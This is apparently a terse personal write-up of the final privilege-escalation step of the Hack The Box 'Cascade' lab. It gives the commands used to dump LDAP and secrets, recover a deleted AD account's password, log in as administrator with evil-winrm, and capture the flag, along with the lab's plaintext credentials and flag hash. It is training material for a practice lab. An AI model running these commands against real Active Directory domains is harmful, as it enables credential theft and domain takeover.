
Now with all the data we can figure that we have to retrieve the password.

If you recall we have the note !!!
```
This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password).
```

![[Pasted image 20240919031500.png]]

I think we have to recover from AD recycle bin the password let's take the help of google fu and chat gpt

```
ldapdomaindump ldaps://10.10.10.182 -u 'Cascade.local\ArkSvc' -p 'w3lc0meFr31nd'
```


```
secretsdump.py Cascade.local/ArkSvc:'w3lc0meFr31nd'@10.10.10.182 
```


```
bloodhound-python -d Cascade.local -u ArkSvc -p 'w3lc0meFr31nd' -ns 10.10.10.182  -c all
```
![[Pasted image 20240919033540.png]]

```
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```

![[Pasted image 20240919035359.png]]


```
Restore-ADObject -Identity f0cc344d-31e0-4866-bceb-a842791ca059 -NewName TempAdmin
```


```
Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
```

![[Pasted image 20240919035738.png]]
```
YmFDVDNyMWFOMDBkbGVz
```

![[Pasted image 20240919035835.png]]
```
baCT3r1aN00dles
```


```
evil-winrm -u 'administrator' -p 'baCT3r1aN00dles' -i 10.10.10.182
```

```
8bb0589a72dd5cdd44b009e07b0d2bdc
```
![[Pasted image 20240919040059.png]]


